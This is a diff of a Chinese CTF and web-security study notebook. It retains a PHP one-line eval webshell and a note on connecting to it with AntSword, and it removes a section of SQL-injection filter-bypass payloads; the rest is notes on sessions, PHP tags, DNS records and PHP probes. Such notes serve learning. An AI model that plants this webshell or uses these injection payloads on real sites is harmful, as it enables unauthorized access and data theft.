@@ -6,7 +6,7 @@
 
 ---
 
-（这似乎是一句很常用到的木马？）
+一句话木马：
 
 `<?php @eval($_POST['CMD']);?> `
 
@@ -16,157 +16,129 @@ php语法中，如果在函数前加入`!`则表示取反操作符，即当函�
 
 ---
 
-注入点为**数值型注入**时，可往题目原访问点传一个-1,由于id通常不为负数,后端根据id查询不到内容,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置
-
----
-
-**几种绕过空格限制的方法：**
-
-+ URL编码：
-
-	1. 最常用的空格替换是 %20，这是空格的标准URL编码。
-	2. 在某些情况下，%A0（代表不换行空格）也可能有效，尤其是在Mysql环境中。
-	3. 其他可能的编码包括 %0A（换行）、%0B（垂直制表）、%0C（表格制表）、%0D（回车）、%09（水平制表）等，它们在特定上下文中可能被解析为空格。
-
-+ 特殊字符：
-
-	1. 使用全角空格（　），在一些不严格的过滤机制中可能被接受。
-	2. 非打印字符，如%C2%A0（Unicode的不换行空格）。
-
-+ 注释符和字符串连接：
-
-	在SQL注入场景中，可以利用注释符（如-- 或 /* ... */）来规避空格需求，或者在条件语句中使用字符串连接符（如MySQL中的concat()函数）来构造无需空格的语句。
-
-+ 编码转换：
-	利用HTML实体编码，如 &#32; 表示空格，但这通常不适用于URL或查询参数，更适合于HTML内容本身。
-
-+ 多字节字符：
-	某些多字节字符（尤其是全角字符或特殊Unicode字符）在某些系统或库中可能被解释为空格。
-
-+ 利用编程语言特性：
-	在一些语言中，如Python，空格在某些上下文中可能不是必需的（如使用点号访问属性时）。
-
-+ 调整语法结构：
-	重新组织SQL查询或其他命令的结构，避免需要空格的地方。
-
-+ 利用特定漏洞或弱点：
-	如文件路径处理中的特殊案例，可能允许使用非标准字符作为路径分隔符。
-
----
-
 在linux中，/var/www/html为网站文件默认存放位置
 
+可以通过`pwd`查看默认目录
+
 ---
 
-SQL注入
+蚁剑unable_to_verify_leaf_signnature问题解决：
 
-**注释符**
+想抓个flag 一直连不上看不到txt
 
-```
-'#', '--+', '-- -', '%23', '%00', '/**/'
-```
+1、如果是https协议
 
- **"and、or" 过滤**
+记得上传证书
 
-```SQL
-可以使用"&&"和"||"代替
-?id=1 && 1=1 --+
+2、如果是http
 
-# 盲注，异或运算相同为0，不同为1；根据返回值0，1判断
-?id=1 union select (substr(database(),1,1)='s') ^ 0 --
-```
+那么就检查 一句话木马的shell 是否正确
 
-**大小写绕过**
+---
 
-```SQL
-id=-1' UnIoN SeLeCT xxx
-```
+`Vim`：
 
-**双写绕过**
+Vim 是一个功能强大、高度可定制的文本编辑器。
 
-适用于将关键词置空的场景
+它在命令行模式下工作，具有众多快捷键和命令，允许用户高效地编辑文本。Vim 具有很好的跨平台性，在 Linux、Unix、Mac 和 Windows 等操作系统上都能使用。
 
-```SQL
-id=-1'UNIunionONSeLselectECT1,2,3–-
-```
+在生产环境中使用 Vim 通常是为了直接在服务器上快速编辑配置文件、日志文件或代码文件等。
 
-**编码绕过**
+---
 
-可以使用URL，hex，ASCII等编码绕过
+域名解析可以获取到多种类型的信息，常见的包括：
 
-例如'or 1=1
+1. A 记录（Address Record）：将域名指向一个 IPv4 地址。
+2. AAAA 记录（IPv6 Address Record）：将域名指向一个 IPv6 地址。
+3. CNAME 记录（Canonical Name Record）：将域名指向另一个域名。
+4. MX 记录（Mail Exchange Record）：指定负责处理该域名电子邮件的邮件服务器。
+5. NS 记录（Name Server Record）：指定该域名由哪些域名服务器进行解析。
+6. TXT 记录（Text Record）：可以用于存储任意的文本信息，常用于验证域名所有权、设置 SPF 记录（用于反垃圾邮件）等。
+7. PTR 记录（Pointer Record）：用于从 IP 地址反向解析到域名。
 
-```SQL
-27%20%4F%52%201%3D%31%20%2D%2D
-```
+---
 
-**注释绕过**
+asp程序：
 
-内联注释/**/将关键词分隔开
+ASP（Active Server Pages）是一种服务器端脚本技术，用于创建动态网页。
 
-```SQL
-id=1' UN/**/ION SE/**/LECT database() --
-```
+ASP 程序通常包含 HTML 标记和嵌入的 VBScript 或 JavaScript 脚本代码。在服务器端，当用户请求一个 ASP 页面时，服务器会解释和执行其中的脚本代码，生成动态的 HTML 内容，并将其发送回客户端浏览器显示。
 
-#### 空格过滤
+---
 
-内联注释代替空格
+access数据库：
 
-```SQL
-id=1/**/and/**/1=1
-```
+与sql server相似，是个数据库管理系统。
 
-括号嵌套
+一般的目录是`db`目录
 
-```SQL
-select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());
-```
+---
 
-制表符、换行、不可见空格
+在网页源码页中可以用`ctrl+f`进行元素搜索
 
-```SQL
-%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)
-```
+---
 
-反引号
+php 探针：用来探测空间、服务器运行状况和 PHP 信息，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。 
 
-```SQL
-union(selecttable_name,table_typefrominformation_schema.tables);
-```
-
-#### 比较符号 "=、<、>"过滤
-
-in()
-
-```SQL
-ascii(substr(select database(),1,1)) in(115);        //根据回显判断
-```
-
-like
+常见的 php 探针：
 
 ```
-like代替'='
+雅黑 php 探针：每秒更新，不用刷网页，适用于Linux系统，可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。
+X探针：又名刘海探针、X-Prober，是一款由 INN STUDIO 原创主导开发的开源 PHP 探针，拥有美观简洁的界面、极高的运行效率和极低的资源占用，能高精度显示服务器的相应信息。
+UPUPW php 探针：用于 windows/linux 平台的服务器中,可以防止服务器路径泄露，防 XSS 漏洞攻击，同时支持 PHP7.2 版本，并兼容 PHP5.2-PHP5.6 组件和参数检测。
 ```
 
-正则表达式
 
-```SQL
-select database() regexp '^s'; //根据回显判断
+
+---
+
+`token`：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，**当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码**
+
+---
+
+在 Python 中，`try-except` 块用于捕获和处理异常。
+
+`try` 块中放置可能会引发异常的代码。如果在 `try` 块中的代码执行时发生了异常，Python 会立即跳转到对应的 `except` 块来处理异常。
+
+---
+
+**php短标签**：
+
+```
+<? echo '123';?>  #前提是开启配置参数short_open_tags=on
+<?=(表达式)?>  等价于 <?php echo (表达式)?>  #不需要开启参数设置
+<% echo '123';%>   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用
+<script language="php">echo '123'; </script> #不需要修改参数开关，但是只能在7.0以下可用。
 ```
 
-#### 逗号过滤
+---
 
-逗号被过滤时可以使用from...for...
+session：
 
-```SQL
-select substr(select database() from 1 for 1);
-select substr(select database() from 2 for 1);
-```
+**什么是session**
 
-limit中的逗号可以替换成offset
+>  session在网络应用中称为“会话控制”，是服务器为了保存用户状态而创建的一个特殊的对象。简而言之，session就是一个对象，用于存储信息。 
 
-```SQL
-select * from users limit 1 offset 2;
-```
+**session有什么用**
 
-需要注意，limit 1,2 指的是从第一行往后取2行（包括第一行和第二行)；而limit 1 offset 2是从第一行开始只取第二行
+> session是存储于服务器端的特殊对象，服务器会为每一个游览器(客户端)创建一个唯一的session。这个session是服务器端共享，每个游览器(客户端)独享的。我们可以在session存储数据，实现数据共享。
+
+**session的存储形式**
+
+>  session类似于一个Map，里面可以存放多个键值对，是以key-value进行存放的。key必须是一个字符串，value是一个对象。
+
+**session底层实现机制**
+
+> session是每一个游览器(客户端)所唯一的，这个是怎么实现的呢？其实，在访问一个网站时，在HTTP请求中往往会携带一个cookie，这个cookie的名字是JSESSIONID，这个JSESSIONID表示的就是session的id，这个是由服务器创建的，并且是唯一的。服务器在使用session时，会根据JSESSIONID来进行不同操作。
+
+**session和cookie的比较**
+
+- cookie保存在客户端，session保存在服务端
+- cookie作用于他所表示的path中(url中要包含path)，范围较小。session代表客户端和服务器的一次会话过程，web页面跳转时也可以共享数据，范围是本次会话，客户端关闭也不会消失。会持续到我们设置的session生命周期结束(默认30min)
+- 我们使用session需要cookie的配合。cookie用来携带JSESSIONID
+- cookie存放的数据量较小，session可以存储更多的信息。
+- cookie由于存放在客服端，相对于session更不安全
+- 由于session是存放于服务器的，当有很多客户端访问时，肯定会产生大量的session，这些session会对服务端的性能造成影响。
+	
+
+*在Linux系统中，session文件一般的默认存储位置为 `/tmp 或 /var/lib/php/session`*，当session.use_strict_mode为on，我们可以自己设置Cookie：PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。
